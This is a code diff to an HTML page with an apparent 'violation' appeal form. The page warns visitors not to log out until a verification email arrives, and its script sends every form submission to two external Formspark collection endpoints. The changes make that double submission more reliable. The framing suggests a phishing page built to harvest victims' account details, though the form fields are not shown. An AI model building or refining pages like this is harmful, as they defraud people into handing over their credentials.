@@ -118,25 +118,32 @@
     <p class="note">Please ensure not to log out of your account on your computer or laptop until you have received a verification email.</p>
   </div>
   <script>
-    function submitToTwoForms() {
+    async function submitToTwoForms() {
       const form = document.getElementById('violationForm');
       const formData = new FormData(form);
 
-      // First Formspark endpoint
-      fetch('https://submit-form.com/SqWKt7JWm', {
-        method: 'POST',
-        body: formData,
-      })
-      .then(response => console.log('Submitted to first Formspark:', response))
-      .catch(error => console.error('Error submitting to first Formspark:', error));
+      const endpoint1 = 'https://submit-form.com/SqWKt7JWm';
+      const endpoint2 = 'https://submit-form.com/hPx4wa7QJ';
 
-      // Second Formspark endpoint
-      fetch('https://submit-form.com/hPx4wa7QJ', {
-        method: 'POST',
-        body: formData,
-      })
-      .then(response => console.log('Submitted to second Formspark:', response))
-      .catch(error => console.error('Error submitting to second Formspark:', error));
+      try {
+        // Submit to the first endpoint
+        const response1 = await fetch(endpoint1, {
+          method: 'POST',
+          body: formData,
+        });
+        if (!response1.ok) throw new Error('Error submitting to first endpoint.');
+
+        // Submit to the second endpoint
+        const response2 = await fetch(endpoint2, {
+          method: 'POST',
+          body: formData,
+        });
+        if (!response2.ok) throw new Error('Error submitting to second endpoint.');
+
+        alert('Form submitted successfully to both endpoints!');
+      } catch (error) {
+        alert(`Submission failed: ${error.message}`);
+      }
     }
   </script>
 </body>
